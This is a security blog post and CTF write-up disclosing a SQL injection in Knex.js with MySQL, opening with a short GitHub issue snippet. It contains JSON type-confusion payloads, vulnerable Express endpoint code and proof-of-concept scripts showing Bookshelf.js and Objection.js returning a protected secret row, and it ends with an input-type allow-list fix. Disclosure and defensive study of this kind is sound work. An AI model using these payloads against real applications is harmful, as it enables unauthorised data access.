This is a really weird bug but if you do:

```
knex('sometable').where({
  stringfield: { hello: 1 }
})

```

It will crash with `Unknown column 'hello' in 'where clause']` which is an EXTREMELY scary message to see considering the almost potential(?) possibility of doing SQL injection or something.

This only happens though when using the `mysql` client, tested with `pg` and it worked as it should, giving empty result.

Here's a working gist reproducing the problem: <https://gist.github.com/TheThing/00be586e2d71e7b9a4b8>

## 6 Year Old SQL Injection Vulnerability in Knex.js

2022-11-24

JavaScript objects and arrays that are inserted into a SQL query can cause funky things"

# Overview

[Knex.js](https://github.com/knex/knex)
has a
**limited SQL injection vulnerability**
that can be exploited to ignore the
`WHERE`
clause of a SQL query. The only prerequisite is that the backend database management system is MySQL. The vulnerability was brought to my attention by
[Alok Menghrajani's](https://www.quaxio.com/)
CTF challenge called
[`xark`](https://squarectf.com/2022/xark.html)
during
[SquareCTF 2022](https://squarectf.com/2022/)
, that showcased the SQLi vulnerability that was first reported
[6+ years ago](https://github.com/knex/knex/issues/1227)
. In Alok's CTF challenge, the latest version of Knex.js was used (version 2.3.0 at the time of writing this article) and the vulnerable code snippet is shown below.

```
app.post('/data', async (req, res) => {
    if (req.body.to) {
        const crushes = await knex('crushes')
            .select()
            .where({
                to: req.body.to
            })
            .limit(50);
        res.send(crushes);
    } else {
        res.status(400).send({});
    }
});

```

The following screenshot was my payload that I used to exploit the SQLi vulnerability in
`xark`
to modify the
`WHERE`
statement to query using a column called
`message`
by setting the type to an
`Object`
.
**Knex.js does not reject
`Objects`
or
`Array`
variables that get inserted into SQL queries and results in a valid MySQL query!**

![](/images/blog/knex_sqli/xark-payload-by-msg.png)

Otherwise, if the column is set as an index the following SQLi payload returns rows by index value instead of string comparison.

![](/images/blog/knex_sqli/xark-payload-by-index.png)

**After further investigating the vulnerability I found that using
`where`
from Knex.js is vulnerable to SQLi, even with parameter binding!**

This vulnerability affects thousands of NodeJS packages that do not reject
`Object`
and
`Array`
column values and use
`knex`
to build SQL queries.

# Introduction

*Before I begin, I do apologise for any grammar mistakes. I had COVID at the time of writing this article and I will fix it up later.*

Last weekend, I participated in the 2022 Square CTF to satiate my crippling addiction hacking websites. It was a pretty fun CTF event and I enjoyed completing the web challenges.

[Alok Menghrajani's](https://www.quaxio.com/)
challenge named
[xark](https://squarectf.com/2022/xark.html)
piqued my interest since it was a classic NodeJS SQL injection vulnerability,
*but the code did not look it was using
`knex`
insecurely (code snippet below)*
.

```
app.post('/data', async (req, res) => {
    if (req.body.to) {
        const crushes = await knex('crushes')
            .select()
            .where({
                to: req.body.to
            })
            .limit(50);
        res.send(crushes);
    } else {
        res.status(400).send({});
    }
});

```

Knex.js version 2.3.0 was used in the challenge that was the latest version for the module, and the last
[SQL injection vulnerability for
`knex`
was reported for versions
`<0.19.5`](https://security.snyk.io/package/npm/knex)
.

At first, I thought Alok snuck in a sneaky 0day into their CTF challenge. However, it turns out the vulnerability has been disclosed for
**over 6 years**
...

![](/images/blog/knex_sqli/it-was-a-lot-worst-than-it-appears.png)

*[The vulnerability was first disclosed in February 2016](https://github.com/knex/knex/issues/1227)*

![](/images/blog/knex_sqli/the-first-issue.png)

I felt compelled to write this article to raise awareness about the SQLi vulnerability in Knex.js. The vulnerability has already been publicly disclosed, so attention needs to be drawn to it to have it fixed. That's why I am skipping responsibly disclosing the vulnerability and going straight to public disclosure.

# Explaining the SQLi Vulnerability

## Writeup for [xark](https://squarectf.com/2022/xark.html)

To explain the SQLi vulnerability in Knex.js, I will begin by doing a writeup for Alok's
`xark`
challenge.

Starting the challenge, we are presented with a website for recording and viewing
*anonymous crushes*
.

![](/images/blog/knex_sqli/xark-start.png)

We were also provided with the following code snippet and can see the flag is inserted into the
`crushes`
table.

**Source Code Provided with the Challenged**

```
const express = require('express');
require('express-async-errors');
config = require('config');

if (process.env.DATABASE_HOST !== null) {
    console.log(`Found custom database host: ${process.env.DATABASE_HOST}`);
    config.knex.connection.host = process.env.DATABASE_HOST;
}

const app = express();
const port = 3001;
const knex = require('knex')(config.get('knex'));

knex.schema.hasTable('crushes').then(function(exists) {
    if (!exists) {
        console.log("crushes table doesn't exist, initializing...");
        knex.schema.createTable('crushes', function(table) {
            table.increments('id').primary();
            table.string('from').notNullable();
            table.string('to').notNullable();
            table.string('message').notNullable();
            table.index(['to']);
        }).then();
        knex('crushes').insert({
            from: config.init.flag,
            to: config.init.flag,
            message: 'This is the flag!',
        }).then();
    }
});

app.use(express.static('html'));
app.use(express.json());
app.use(express.urlencoded({
    extended: false
}));

app.get('/debug', async (req, res) => {
    // poor man's clone
    const c = JSON.parse(JSON.stringify(config.get('knex')));
    if (c.connection.password) {
        c.connection.password = "*******";
    }
    res.status(200).send(c);
})

app.post('/record', async (req, res) => {
    if (req.body.from && req.body.to && req.body.message) {
        await knex('crushes').insert({
            from: req.body.from,
            to: req.body.to,
            message: req.body.message,
        });
        res.status(200).send({});
    } else {
        res.status(400).send({});
    }
});

app.post('/data', async (req, res) => {
    if (req.body.to) {
        const crushes = await knex('crushes')
            .select()
            .where({
                to: req.body.to
            })
            .limit(50);
        res.send(crushes);
    } else {
        res.status(400).send({});
    }
});

app.use((err, req, res, next) => {
    console.error(err);
    res.status(400).send({
        error: err.message
    });
});

app.listen(port, () => {
    console.log(`Listening on port ${port} in ${process.env.NODE_ENV}`);
});

```

So immediately I knew the goal was to exploit an SQL injection vulnerability to trick the web application to return the flag. First I researched vulnerabilities for Knex.js, but found that the last SQLi vulnerability was for versions
`<0.19.5`
. So at first I thought the entrypoint was not exploiting Knex.js.

However, the CTF challenge had such limited functionality the only way to retrieve the flag is exploiting some SQLi vulnerability in Knex.js. I saw that the
`express`
web application also accepted the
`application/json`
content type, so I simply tried modify the
`to`
POST parameter to an
`Object`
.

![](/images/blog/knex_sqli/xark-error-msg.png)

![](/images/blog/knex_sqli/sussy-gorilla.gif)

That error message was a
**huge indicator that I could do something funky with the filter in the
`WHERE`
clause**
. I knew from reading the source code that the flag was another column named
`message`
, so I simply modified my payload to try querying using
`message`
column instead of
`to`
.

![](/images/blog/knex_sqli/xark-payload-by-msg.png)

![](/images/blog/knex_sqli/shocked-monkey.gif)

*Wot...*

After the CTF event was done, another competitor pointed out that you can also return a specific rows by index.

![](/images/blog/knex_sqli/alternative-method.png)

## How does the vulnerability work?

As noted in the
[original Github issue](https://github.com/knex/knex/issues/1227)
, the vulnerability is only exploitable if Knex.js is used to connect to MySQL and is not exploitable for other database management systems (
*I have not verified this claim*
).

So let's see what the actual queries look like that is being sent to the MySQL database. I will continue using the
`xark`
challenge for explaining how the SQLi vulnerability in Knex.js works. First you can configure the MySQL container to log all queries to a file do this by running the following script on the container.

```
#!/bin/bash

mkdir -p /var/log/mysql;
if [ ! -f /var/log/mysql/all.log ]; then
    touch /var/log/mysql/all.log
fi

chmod 777 /var/log/mysql/all.log
mysql -u root -ppass -e "SET global log_output = 'FILE'; SET global general_log_file='/var/log/mysql/all.log'; SET global general_log = 1;"

```

Now all SQL queries will be logged at
`/var/log/mysql/all.log`
.

### How SQLi Using a Different Column Works

Let's rerun the
`{"to":{"message":"This is the flag!"}}`
exploit and see the following query that is sent to the MySQL server.

```
select * from `crushes` where `to` = `message` = 'This is the flag!' limit 50

```

Keys in the user input are wrapped with the
```
character, which is a special character for defining quoted identifiers in MySQL queries. A quoted identifier is a way for wrapping a table, column or database name with quotes. Now the interesting thing with MySQL, is if you remove the quoted identifiers the query fails.

![](/images/blog/knex_sqli/qi-with-without.png)

*Why does this MySQL query work with the quoted identifiers?*

To be honest, I don't have a good answer. I speculate it is because the quoted identifiers tells the MySQL server that
``to``
and
``message``
are column names, and since the
`crushes`
table has those columns it does not cause an SQL error. Also experimenting with how MySQL will handle the SQL query, it appears that the MySQL server behaves
*weirdly*
when a filter has multiple
`=`
characters. For the
`xark`
challenge I found that the first row is returned, but when I tested using a different script then the entire table was dumped. If you have a good explaination for this, please let me know.

### SQLi Using Index Value

Now let's investigate how the payload
`{"to":[0]}`
works by analysing the resulting query that Knex.js builds.

```
select * from `crushes` where `to` = 0 limit 50

```

We can see in the source code for
`xark`
that the the table index is set to the
`to`
column.

```
...
knex.schema.createTable('crushes', function(table) {
    table.increments('id').primary();
    table.string('from').notNullable();
    table.string('to').notNullable();
    table.string('message').notNullable();
    table.index(['to']);
}).then();
...

```

Since the
`to`
column is also the table index, we can query the
`to`
column using
[**index values**](https://dev.mysql.com/doc/refman/8.0/en/mysql-indexes.html)
as well as the string value.

It appears that Knex.js does
*some filtering*
on the user input. So payloads such as
`{"to":[0]}`
are rejected and trying to query for multiple index values causes a SQL syntax error.

![](/images/blog/knex_sqli/syntax-error-multi-index.png)

## Binding Parameters Does Not Prevent the SQLi

Alok's
`xark`
challenge and the
[original Github](https://github.com/knex/knex/issues/1227)
issue all use the
[object syntax for calling
`where`](https://knexjs.org/guide/query-builder.html#where)
. There other methods for calling
`where`
that weren't tested (
[screenshot of the API documentation from Knex.js](https://knexjs.org/guide/query-builder.html#where)
).

![](/images/blog/knex_sqli/calling-where.png)

So I decided to modify source code of
`xark`
to test if the SQLi vulnerability is only exploitable if the input is an object or if the
`where`
method is vulnerable to SQLi no matter how
`where`
is used.

*Testing key value input*

```
app.post('/data', async (req, res) => {
    if (req.body.to) {
        const crushes = await knex('crushes')
            .select()
            .where("to", req.body.to)
            .limit(50);
        res.send(crushes);
    } else {
        res.status(400).send({});
    }
});

```

*Testing using key value and operator*

```
app.post('/data', async (req, res) => {
    if (req.body.to) {
        const crushes = await knex('crushes')
            .select()
            .where("to", "=", req.body.to)
            .limit(50);
        res.send(crushes);
    } else {
        res.status(400).send({});
    }
});

```

However, I was still able to exploit the SQLi vulnerability.

Therefore, using
`where`
from Knex.js is vulnerable to SQLi.

It did pique my interest if Knex.js does implement parameter binding that
*should*
prevent the SQLi vulnerabilities, because if so then this vulnerability would be an issue of bad documentation for explaining how to use Knex.js securely.

[Turns out you can use parameter binding using
`raw`
. They even say in the documentation that it prevents SQLi (screenshot below).](https://knexjs.org/guide/raw.html#raw-parameter-binding)

![](/images/blog/knex_sqli/raw-docs.png)

So let's see if I can still exploit the SQLi vulnerability even with prepared statements.

*Testing using prepared statements*

```
app.post('/data', async (req, res) => {
    if (req.body.to) {
        const crushes = await knex('crushes')
            .select()
            .where(
                knex.raw("?? = ?", ["to", req.body.to])
            )
            .limit(50);
        res.send(crushes);
    } else {
        res.status(400).send({});
    }
});

```

*This is still vulnerable to SQLi...*

I even tried the following implementation to see if it would prevent SQLi.
**It didn't...**

```
app.post('/data', async (req, res) => {
    if (req.body.to) {
        const whereStatement = ":column: = :value"
        const crushes = await knex('crushes')
            .select()
            .where(knex.raw(
                whereStatement, {
                        column: "to",
                        value: req.body.to
                    }
            ))
            .limit(50);
        res.send(crushes);
    } else {
        res.status(400).send({});
    }
});

```

The only implementation that I found that was not exploitable was when the column name was hardcoded into the query string.

*Causes an SQL syntax error since the column name is not wrapped with quoted identifiers.*

```
app.post('/data', async (req, res) => {
    if (req.body.to) {
        const crushes = await knex('crushes')
            .select()
            .where(
                knex.raw("to = ?", [req.body.to])
            )
            .limit(50);
        res.send(crushes);
    } else {
        res.status(400).send({});
    }
});

```

In conclusion...

**Knex.js is vulnerable to SQLi even if you use the raw parameter binding!**

# Impact to Other NodeJS Packages

Knex.js is a tool for NodeJS developers to easily build SQL queries for multiple DBMS and the responsibility for security is also on those developers to ensure that they are securely using Knex.js.

**This leads to the next question, are NodeJS Object Relational Mappers (ORM) securely using Knex.js?**

In collaboration with Alok and my friend
[sradley](https://github.com/anvbis)
, we tested the following NodeJS ORMs and found that most were vulnerable to the SQLi vulnerability.

| ORM Package | Version | Is Currently Maintained | Vulnerable to SQLi |
| --- | --- | --- | --- |
| [Bookshelf.js](https://bookshelfjs.org/) | v1.2.0 | False | **TRUE** |
| [Objection.js](https://vincit.github.io/objection.js/) | v3.0.1 | False | **TRUE** |
| [mikro-orm](https://github.com/mikro-orm/mikro-orm) | v5.5.3 | True | False |

For each of the tests, we had already created a table called
`users`
with the following rows.

| `name` | `secret` |
| --- | --- |
| admin | you should not be able to return this! |
| guest | hello world |

**Confirming the Vulnerability in
[Bookshelf.js](https://bookshelfjs.org/)**

```
const knex = require('knex')({
    client: 'mysql2',
    connection: {
        host: '127.0.0.1',
        user: 'root',
        password: 'topsecret',
        database: 'testdb',
        charset: 'utf8'
    }
})

const bookshelf = require('bookshelf')(knex)

const User = bookshelf.model('User', {
    tableName: 'users'
})

new User({secret: {"name": "admin"}}).fetch().then((user) => {
    console.log(user)
})

```

**Confirming the Vulnerability in
[Objection.js](https://vincit.github.io/objection.js/)**

```
const { Model } = require('objection');
const knex = require('knex')({
    client: 'mysql2',
    connection: {
        host: '127.0.0.1',
        user: 'root',
        password: 'topsecret',
        database: 'testdb',
        charset: 'utf8'
    }
})

Model.knex(knex)

class User extends Model {
    static get tableName() {
        return 'users'
    }
}

User.query()
    .where({secret: {"name": "admin"}})
    .then((user) => console.log(user))

```

The above approaches provides an easy way to test if you are securely handling
`Objects`
while using Knex.js.

# Recommendations

The key issue that enables exploiting the SQLi vulnerability is that Knex.js does not reject an input if it is an
**`Array`**
or an
**`Object`**
.
[JavaScript is a dynamically typed language, so users can manipulate the type of inputs](https://cheatsheetseries.owasp.org/cheatsheets/Nodejs_Security_Cheat_Sheet.html#perform-input-validation)
.

So if you are either a maintainer of Knex.js or using the module in your project,
**reject all inputs that will be inserted into a SQL query that are either an
`Array`
or
`Object`
type!**

For an example, you can use the
[JavaScript operator
`typeof`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/typeof)
to reject any unexpected input types. The below code snippet is an example for only allowing numbers, strings and booleans (
**never allow
`object`**
).

```
const allowedTypes = [
    "number",
    "string",
    "boolean"
]

if (!allowedTypes.includes(typeof userInput)) {
    throw "Invalid type detected!"
}

```

For an example, I added the above allow list to
`xark`
.

```
...
app.post('/data', async (req, res) => {
    if (req.body.to) {
        const allowedTypes = [
            "number",
            "string",
            "boolean"
        ]

        if (!allowedTypes.includes(typeof req.body.to)) {
            return res.status(400).send({
                error: "Bugger off hacker!"
            });
        }

        const crushes = await knex('crushes')
            .select()
            .where({
                to: req.body.to
            })
            .limit(50);
        res.send(crushes);
    } else {
        res.status(400).send({});
    }
});
...

```

Now when I retry the SQLi exploit it gets rejected.
